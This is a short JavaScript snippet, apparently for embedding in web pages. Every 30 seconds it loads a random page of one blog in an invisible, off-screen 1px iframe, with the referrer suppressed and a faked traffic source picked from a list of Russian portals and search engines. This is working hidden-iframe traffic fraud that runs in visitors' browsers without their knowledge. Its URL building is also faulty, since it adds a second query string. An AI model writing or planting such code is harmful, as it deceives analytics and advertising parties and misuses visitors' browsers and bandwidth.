  const urls = [
    "https://www.nobletouch.online/2024/09/10.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobletouch.online/2024/09/blog-post.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobletouch.online/2024/09/blog-post_26.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobletouch.online/2024/09/blog-post_73.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobletouch.online/2024/09/blog-post_34.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobletouch.online/2024/09/blog-post_79.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobletouch.online/2024/09/blog-post_14.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobletouch.online/2024/09/blog-post_4.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobletouch.online/2024/09/blog-post_59.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobletouch.online/2024/09/blog-post_39.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
  ];

  const sources = [
    "utro.ru", "mail.rambler.ru", "vz.ru", "ozon.ru", "rambler.ru", "pikabu.ru",
    "rsport.ria.ru", "radiosputnik.ria.ru", "kp.ru", "lenta.ru", "avito.ru",
    "drom.ru", "habr.com", "news.mail.ru", "realty.ria.ru", "rbc.ru",
    "aliexpress.ru", "otvet.mail.ru", "gazeta.ru", "smi2.ru", "kommersant.ru",
    "mk.ru", "ria.ru", "yandex", "google", "bing", "vk", "fotostrana", "ok", "zen"
  ];

  function loadIframe() {
    const page = urls[Math.floor(Math.random() * urls.length)];
    const source = sources[Math.floor(Math.random() * sources.length)];
    const fullUrl = page + "?utm_source=" + encodeURIComponent(source);

    const iframe = document.createElement("iframe");
    iframe.src = fullUrl;
    iframe.style = "width:1px; height:1px; opacity:0.01; position:absolute; left:-9999px;";
    iframe.referrerPolicy = "no-referrer";
    document.body.appendChild(iframe);
  }

  // Загружаем iframe сразу и повторяем каждые 30 сек
  loadIframe();
  setInterval(loadIframe, 30000);
